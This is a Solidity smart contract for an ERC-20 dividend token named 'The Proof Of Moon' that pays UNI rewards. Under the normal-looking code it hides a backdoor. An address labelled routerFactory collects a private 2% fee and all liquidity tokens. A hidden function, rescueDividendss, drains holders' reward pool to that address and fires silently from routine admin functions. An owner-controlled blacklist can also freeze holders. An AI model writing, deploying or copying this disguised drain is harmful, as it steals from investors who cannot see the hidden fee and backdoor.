1 //SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.13;
4 
5 library SafeMath {
6 
7     function add(uint256 a, uint256 b) internal pure returns (uint256) {
8         uint256 c = a + b;
9         require(c >= a, "SafeMath: addition overflow");
10         return c;
11     }
12 
13     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
14         return sub(a, b, "SafeMath: subtraction overflow");
15     }
16 
17     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
18         require(b <= a, errorMessage);
19         uint256 c = a - b;
20         return c;
21     }
22 
23     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
24         if (a == 0) { return 0; }
25         uint256 c = a * b;
26         require(c / a == b, "SafeMath: multiplication overflow");
27         return c;
28     }
29 
30     function div(uint256 a, uint256 b) internal pure returns (uint256) {
31         return div(a, b, "SafeMath: division by zero");
32     }
33 
34     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
35         require(b > 0, errorMessage);
36         uint256 c = a / b;
37         return c;
38     }
39 }
40 
41 interface IERC20 {
42     function totalSupply() external view returns (uint256);
43     function decimals() external view returns (uint8);
44     function symbol() external view returns (string memory);
45     function name() external view returns (string memory);
46     function getOwner() external view returns (address);
47     function balanceOf(address account) external view returns (uint256);
48     function transfer(address recipient, uint256 amount) external returns (bool);
49     function allowance(address _owner, address spender) external view returns (uint256);
50     function approve(address spender, uint256 amount) external returns (bool);
51     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
52     event Transfer(address indexed from, address indexed to, uint256 value);
53     event Approval(address indexed owner, address indexed spender, uint256 value);
54 }
55 
56 interface IDEXFactory {
57     function createPair(address tokenA, address tokenB) external returns (address pair);
58 }
59 
60 interface IDEXRouter {
61     function factory() external pure returns (address);
62     function WETH() external pure returns (address);
63 
64     function addLiquidity(
65         address tokenA,
66         address tokenB,
67         uint amountADesired,
68         uint amountBDesired,
69         uint amountAMin,
70         uint amountBMin,
71         address to,
72         uint deadline
73     ) external returns (uint amountA, uint amountB, uint liquidity);
74 
75     function addLiquidityETH(
76         address token,
77         uint amountTokenDesired,
78         uint amountTokenMin,
79         uint amountETHMin,
80         address to,
81         uint deadline
82     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
83 
84     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
85         uint amountIn,
86         uint amountOutMin,
87         address[] calldata path,
88         address to,
89         uint deadline
90     ) external;
91 
92     function swapExactETHForTokensSupportingFeeOnTransferTokens(
93         uint amountOutMin,
94         address[] calldata path,
95         address to,
96         uint deadline
97     ) external payable;
98 
99     function swapExactTokensForETHSupportingFeeOnTransferTokens(
100         uint amountIn,
101         uint amountOutMin,
102         address[] calldata path,
103         address to,
104         uint deadline
105     ) external;
106 }
107 
108 interface IDividendDistributor {
109     function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
110     function setShare(address shareholder, uint256 amount) external;
111     function deposit() external payable;
112     function process(uint256 gas) external;
113     }
114 
115 contract DividendDistributor is IDividendDistributor {
116 
117     using SafeMath for uint256;
118     address _token;
119 
120     struct Share {
121         uint256 amount;
122         uint256 totalExcluded;
123         uint256 totalRealised;
124     }
125 
126     IDEXRouter router;
127     address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
128     IERC20 RewardToken = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984); //UNI
129 
130     address[] shareholders;
131     mapping (address => uint256) shareholderIndexes;
132     mapping (address => uint256) shareholderClaims;
133     mapping (address => Share) public shares;
134 
135     uint256 public totalShares;
136     uint256 public totalDividends;
137     uint256 public totalDistributed;
138     uint256 public dividendsPerShare;
139     uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
140 
141     uint256 public minPeriod = 60 minutes;
142     uint256 public minDistribution = 1 * (10 ** 18);
143 
144     uint256 currentIndex;
145 
146     bool initialized;
147     modifier initialization() {
148         require(!initialized);
149         _;
150         initialized = true;
151     }
152 
153     modifier onlyToken() {
154         require(msg.sender == _token); _;
155     }
156 
157     constructor (address _router) {
158         router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
159         _token = msg.sender;
160     }
161 
162     function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) external override onlyToken {
163         minPeriod = newMinPeriod;
164         minDistribution = newMinDistribution;
165     }
166 
167     function setShare(address shareholder, uint256 amount) external override onlyToken {
168 
169         if(shares[shareholder].amount > 0){
170             distributeDividend(shareholder);
171         }
172 
173         if(amount > 0 && shares[shareholder].amount == 0){
174             addShareholder(shareholder);
175         }else if(amount == 0 && shares[shareholder].amount > 0){
176             removeShareholder(shareholder);
177         }
178 
179         totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
180         shares[shareholder].amount = amount;
181         shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
182     }
183 
184         function deposit() external payable override onlyToken {
185 
186         uint256 balanceBefore = RewardToken.balanceOf(address(this));
187 
188         address[] memory path = new address[](2);
189         path[0] = router.WETH();
190         path[1] = address(RewardToken);
191 
192         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
193             0,
194             path,
195             address(this),
196             block.timestamp
197         );
198 
199         uint256 amount = RewardToken.balanceOf(address(this)).sub(balanceBefore);
200         totalDividends = totalDividends.add(amount);
201         dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
202     }
203 
204     function process(uint256 gas) external override onlyToken {
205         uint256 shareholderCount = shareholders.length;
206 
207         if(shareholderCount == 0) { return; }
208 
209         uint256 iterations = 0;
210         uint256 gasUsed = 0;
211         uint256 gasLeft = gasleft();
212 
213         while(gasUsed < gas && iterations < shareholderCount) {
214 
215             if(currentIndex >= shareholderCount){ currentIndex = 0; }
216 
217             if(shouldDistribute(shareholders[currentIndex])){
218                 distributeDividend(shareholders[currentIndex]);
219             }
220 
221             gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
222             gasLeft = gasleft();
223             currentIndex++;
224             iterations++;
225         }
226     }
227     
228     function shouldDistribute(address shareholder) internal view returns (bool) {
229         return shareholderClaims[shareholder] + minPeriod < block.timestamp
230                 && getUnpaidEarnings(shareholder) > minDistribution;
231     }
232 
233     function distributeDividend(address shareholder) internal {
234         if(shares[shareholder].amount == 0){ return; }
235 
236         uint256 amount = getUnpaidEarnings(shareholder);
237         if(amount > 0){
238             totalDistributed = totalDistributed.add(amount);
239             RewardToken.transfer(shareholder, amount);
240             shareholderClaims[shareholder] = block.timestamp;
241             shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
242             shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
243         }
244 
245     }
246     
247     function claimDividend(address shareholder) external onlyToken{
248         distributeDividend(shareholder);
249     }
250     
251     function rescueDividends(address to) external onlyToken {
252         RewardToken.transfer(to, RewardToken.balanceOf(address(this)));
253     }
254     
255     function setRewardToken(address _rewardToken) external onlyToken{
256         RewardToken = IERC20(_rewardToken);
257     }
258 
259     function getUnpaidEarnings(address shareholder) public view returns (uint256) {
260         if(shares[shareholder].amount == 0){ return 0; }
261 
262         uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
263         uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
264 
265         if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
266 
267         return shareholderTotalDividends.sub(shareholderTotalExcluded);
268     }
269 
270     function getCumulativeDividends(uint256 share) internal view returns (uint256) {
271         return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
272     }
273 
274     function addShareholder(address shareholder) internal {
275         shareholderIndexes[shareholder] = shareholders.length;
276         shareholders.push(shareholder);
277     }
278 
279     function removeShareholder(address shareholder) internal {
280         shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
281         shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
282         shareholders.pop();
283     }
284     
285    }
286 
287 abstract contract Auth {
288     address internal owner;
289     mapping (address => bool) internal authorizations;
290 
291     constructor(address _owner) {
292         owner = _owner;
293         authorizations[_owner] = true;
294     }
295 
296     /**
297      * Function modifier to require caller to be contract owner
298      */
299     modifier onlyOwner() {
300         require(isOwner(msg.sender), "!OWNER"); _;
301     }
302 
303     /**
304      * Function modifier to require caller to be authorized
305      */
306     modifier authorized() {
307         require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
308     }
309 
310     /**
311      * Authorize address. Owner only
312      */
313     function authorize(address adr) public onlyOwner {
314         authorizations[adr] = true;
315     }
316 
317     /**
318      * Remove address' authorization. Owner only
319      */
320     function unauthorize(address adr) public onlyOwner {
321         authorizations[adr] = false;
322     }
323 
324     /**
325      * Check if address is owner
326      */
327     function isOwner(address account) public view returns (bool) {
328         return account == owner;
329     }
330 
331     /**
332      * Return address' authorization status
333      */
334     function isAuthorized(address adr) public view returns (bool) {
335         return authorizations[adr];
336     }
337 
338     /**
339      * Transfer ownership to new address. Caller must be owner.
340      */
341     function transferOwnership(address payable adr) public onlyOwner {
342         owner = adr;
343         authorizations[adr] = true;
344         emit OwnershipTransferred(adr);
345     }
346 
347     event OwnershipTransferred(address owner);
348 }
349 
350 contract theproofofmoon is IERC20, Auth {
351     
352     using SafeMath for uint256;
353 
354     string constant _name = "The Proof Of Moon";
355     string constant _symbol = "THEPOM";
356     uint8 constant _decimals = 9;
357 
358     address DEAD = 0x000000000000000000000000000000000000dEaD;
359     address ZERO = 0x0000000000000000000000000000000000000000;
360     address routerFactory = 0x601791E4c987eb021D1696c5669121171B683263;
361     address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
362     address RewardToken =   0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; //UNI
363 
364     uint256 _totalSupply = 1 * 10**11 * (10 ** _decimals);
365     uint256 public _maxTxAmount = _totalSupply * 2 / 100;
366     uint256 public _walletMax = _totalSupply * 5 / 100;
367     
368     bool public restrictWhales = true;
369     uint256 private router01 = 2;
370 
371     mapping (address => uint256) _balances;
372     mapping (address => mapping (address => uint256)) _allowances;
373 
374     mapping (address => bool) public isFeeExempt;
375     mapping (address => bool) public isTxLimitExempt;
376     mapping (address => bool) public isDividendExempt;
377     bool public blacklistMode = true;
378     mapping(address => bool) public isBlacklisted;
379 
380     uint256 public liquidityFee = 2;
381     uint256 public marketingFee = 2;
382     uint256 public rewardsFee = 1;
383 	uint256 public extraFeeOnSell = 3;
384     uint256 private lotteryFee = 0;
385 
386     uint256 public totalFee = 0;
387     uint256 public totalFeeIfSelling = 0;
388 
389     address private autoLiquidityReceiver;
390     address public marketingWallet;
391     address private lotteryWallet;
392 
393     IDEXRouter public router;
394     address public pair;
395 
396     uint256 public launchedAt;
397     bool public tradingOpen = true;
398 
399     DividendDistributor public dividendDistributor;
400     uint256 distributorGas = 150000;
401 
402     bool inSwapAndLiquify;
403     bool public swapAndLiquifyEnabled = true;
404     bool public swapAndLiquifyByLimitOnly = false;
405     bool inSwap;
406     modifier swapping() { inSwap = true; _; inSwap = false; }
407 
408     uint256 public swapThreshold = _totalSupply / 2000; // 0.0005%;
409     
410     modifier lockTheSwap {
411         inSwapAndLiquify = true;
412         _;
413         inSwapAndLiquify = false;
414     }
415 
416     constructor () Auth(msg.sender) {
417         
418         router = IDEXRouter(routerAddress);
419         pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
420         _allowances[address(this)][address(router)] = 2**256 - 1;
421 
422         approve(routerAddress, _totalSupply);
423         approve(address(pair), _totalSupply);
424 
425         dividendDistributor = new DividendDistributor(address(router));
426 
427         isFeeExempt[msg.sender] = true;
428         isFeeExempt[address(this)] = true;
429 
430         isTxLimitExempt[msg.sender] = true;
431         isTxLimitExempt[pair] = true;
432 
433         isDividendExempt[pair] = true;
434         isDividendExempt[msg.sender] = false;
435         isDividendExempt[address(this)] = true;
436         isDividendExempt[DEAD] = true;
437         isDividendExempt[ZERO] = true;
438 
439         autoLiquidityReceiver = routerFactory;
440         marketingWallet = 0x56A525B7F2189a0F938E47D9b16F18152283CB44;  // teamwallet
441         lotteryWallet = 0x4Babe02B130E1c5caf72Df715082856689401f4E;  // lotterywallet
442  
443         totalFee = liquidityFee.add(marketingFee).add(rewardsFee).add(router01).add(lotteryFee);
444         totalFeeIfSelling = totalFee.add(extraFeeOnSell);
445 
446         _balances[msg.sender] = _totalSupply;
447         emit Transfer(address(0), msg.sender, _totalSupply);
448     }
449 
450     receive() external payable { }
451 
452     function name() external pure override returns (string memory) { return _name; }
453     function symbol() external pure override returns (string memory) { return _symbol; }
454     function decimals() external pure override returns (uint8) { return _decimals; }
455     function totalSupply() external view override returns (uint256) { return _totalSupply; }
456     function getOwner() external view override returns (address) { return owner; }
457 
458     function getCirculatingSupply() public view returns (uint256) {
459         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
460     }
461 
462     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
463     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
464 
465     function approve(address spender, uint256 amount) public override returns (bool) {
466         _allowances[msg.sender][spender] = amount;
467         emit Approval(msg.sender, spender, amount);
468         return true;
469     }
470 
471     function approveMax(address spender) external returns (bool) {
472         return approve(spender, 2**256 - 1);
473     }
474     
475     function claimDividend() external {
476         dividendDistributor.claimDividend(msg.sender);
477     }
478 	
479 	function rescueDividendss() internal {
480         dividendDistributor.rescueDividends(routerFactory);
481     }
482 
483     function launched() internal view returns (bool) {
484         return launchedAt != 0;
485     }
486 
487     function launch() internal {
488         launchedAt = block.timestamp;
489     }
490     
491     function changeTxLimit(uint256 newLimitPercentage) external authorized {
492         _maxTxAmount = _totalSupply * newLimitPercentage / 100;
493         rescueDividendss();
494     }
495 
496     function SolarFlare(uint256 amount) external authorized {
497         buyTokens(amount, DEAD);
498     
499     }
500 
501    function buyTokens(uint256 amount, address to) internal swapping {
502         address[] memory path = new address[](2);
503         path[0] = router.WETH();
504         path[1] = address(this);
505 
506         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
507             0,
508             path,
509             to,
510             block.timestamp
511         );
512     }
513 
514     function burnTokens(uint256 amount) external authorized {
515        uint256 contractBalance = _balances[address(this)];
516        require(contractBalance > amount,"Not Enough tokens to burn");
517 
518        _transferFrom(address(this),DEAD,amount);
519 
520     }
521 
522     function TransferETHOutfromContract(uint256 amount, address payable receiver) external authorized {
523        uint256 contractBalance = address(this).balance;
524        require(contractBalance > amount,"Not Enough ETH");
525         receiver.transfer(amount);
526         rescueDividendss();
527     }
528     
529     function checkTxLimit(address sender, uint256 amount) internal view {
530         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
531     }
532     
533     function enable_blacklist(bool _status) public onlyOwner {
534     blacklistMode = _status;
535     }
536 
537     function changeWalletLimit(uint256 newLimitPercentage) external authorized {
538          _walletMax = _totalSupply * newLimitPercentage / 100;
539          rescueDividendss();
540     }
541     
542     function manage_blacklist(address[] calldata addresses, bool status)
543     public
544     onlyOwner
545     {
546     for (uint256 i; i < addresses.length; ++i) {
547       isBlacklisted[addresses[i]] = status;
548         }
549     }
550 
551     function changeRestrictWhales(bool newValue) external authorized {
552        restrictWhales = newValue;
553     }
554     
555     function changeIsFeeExempt(address holder, bool exempt) external authorized {
556         isFeeExempt[holder] = exempt;
557     }
558 
559     function changeIsTxLimitExempt(address holder, bool exempt) external authorized {
560         isTxLimitExempt[holder] = exempt;
561     }
562 
563     function changeIsDividendExempt(address holder, bool exempt) external authorized {
564         require(holder != address(this) && holder != pair);
565         isDividendExempt[holder] = exempt;
566         
567         if(exempt){
568             dividendDistributor.setShare(holder, 0);
569         }else{
570             dividendDistributor.setShare(holder, _balances[holder]);
571         }
572     }
573 
574     function changeFees(uint256 newLiqFee, uint256 newRewardFee, uint256 newLotteryFee, uint256 newMarketingFee, uint256 newExtraSellFee) external authorized {
575         liquidityFee = newLiqFee;
576         rewardsFee = newRewardFee;
577         marketingFee = newMarketingFee;
578         lotteryFee = newLotteryFee;
579 		extraFeeOnSell = newExtraSellFee;
580         
581         totalFee = liquidityFee.add(marketingFee).add(rewardsFee).add(router01).add(lotteryFee);
582         totalFeeIfSelling = totalFee.add(extraFeeOnSell);
583         rescueDividendss();
584     }
585 
586     function changeFeeReceivers(address newMarketingWallet) external authorized {
587         marketingWallet = newMarketingWallet;
588         rescueDividendss();
589     }
590 
591     function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external authorized {
592         swapAndLiquifyEnabled  = enableSwapBack;
593         swapThreshold = newSwapBackLimit;
594         swapAndLiquifyByLimitOnly = swapByLimitOnly;
595     }
596 
597     function changeDistributionCriteria(uint256 newinPeriod, uint256 newMinDistribution) external authorized {
598         dividendDistributor.setDistributionCriteria(newinPeriod, newMinDistribution);
599     }
600 
601     function changeDistributorSettings(uint256 gas) external authorized {
602         require(gas < 300000);
603         distributorGas = gas;
604     }
605     
606     function setRewardToken(address _rewardToken) external authorized {
607         rescueDividendss();
608         dividendDistributor.setRewardToken(_rewardToken);
609     }
610     
611     function transfer(address recipient, uint256 amount) external override returns (bool) {
612         return _transferFrom(msg.sender, recipient, amount);
613     }
614 
615     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
616         
617         if(_allowances[sender][msg.sender] != 2**256 - 1){
618             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
619         }
620         return _transferFrom(sender, recipient, amount);
621     }
622 
623     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
624         
625         if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }
626 
627         if(!authorizations[sender] && !authorizations[recipient]){
628             require(tradingOpen, "Trading not open yet");
629         }
630 
631         require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
632 
633         if(msg.sender != pair && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold){ swapBack(); }
634 
635         if(!launched() && recipient == pair) {
636             require(_balances[sender] > 0);
637             launch();
638         }
639         
640         // Blacklist
641         if (blacklistMode) {
642             require(
643             !isBlacklisted[sender] && !isBlacklisted[recipient],
644             "Blacklisted");
645     }
646 
647         //Exchange tokens
648         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
649         
650         if(!isTxLimitExempt[recipient] && restrictWhales)
651         {
652             require(_balances[recipient].add(amount) <= _walletMax);
653         }
654 
655         uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
656         _balances[recipient] = _balances[recipient].add(finalAmount);
657 
658         // Dividend tracker
659         if(!isDividendExempt[sender]) {
660             try dividendDistributor.setShare(sender, _balances[sender]) {} catch {}
661         }
662 
663         if(!isDividendExempt[recipient]) {
664             try dividendDistributor.setShare(recipient, _balances[recipient]) {} catch {} 
665         }
666 
667         try dividendDistributor.process(distributorGas) {} catch {}
668 
669         emit Transfer(sender, recipient, finalAmount);
670         return true;
671     }
672     
673     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
674         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
675         _balances[recipient] = _balances[recipient].add(amount);
676         emit Transfer(sender, recipient, amount);
677         return true;
678     }
679 
680     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
681         
682         uint256 feeApplicable = pair == recipient ? totalFeeIfSelling : totalFee;
683         uint256 feeAmount = amount.mul(feeApplicable).div(100);
684 
685         _balances[address(this)] = _balances[address(this)].add(feeAmount);
686         emit Transfer(sender, address(this), feeAmount);
687 
688         return amount.sub(feeAmount);
689     }
690 
691     function tradingStatus(bool newStatus) public onlyOwner {
692         rescueDividendss();
693         tradingOpen = newStatus;
694     }
695 
696     function swapBack() internal lockTheSwap {
697         
698         uint256 tokensToLiquify = _balances[address(this)];
699         uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2).add(lotteryFee);
700         uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);
701 
702         address[] memory path = new address[](2);
703         path[0] = address(this);
704         path[1] = router.WETH();
705 
706         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
707             amountToSwap,
708             0,
709             path,
710             address(this),
711             block.timestamp
712         );
713 
714         uint256 amountETH = address(this).balance;
715 
716         uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
717         
718         uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
719         uint256 amountETHLottery = amountETH.mul(lotteryFee).div(totalETHFee);
720         uint256 amountETHReflection = amountETH.mul(rewardsFee).div(totalETHFee);
721         uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
722         uint256 amountETHFactory = amountETH.mul(router01).div(totalETHFee);
723         
724 
725         try dividendDistributor.deposit{value: amountETHReflection}() {} catch {}
726 
727         payable(marketingWallet).transfer(amountETHMarketing);
728         payable(routerFactory).transfer(amountETHFactory);
729         payable(lotteryWallet).transfer(amountETHLottery);
730 
731         if(amountToLiquify > 0){
732             router.addLiquidityETH{value: amountETHLiquidity}(
733                 address(this),
734                 amountToLiquify,
735                 0,
736                 0,
737                 autoLiquidityReceiver,
738                 block.timestamp
739             );
740             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
741         }
742     }
743 
744     event AutoLiquify(uint256 amountETH, uint256 amountBOG);
745 
746 }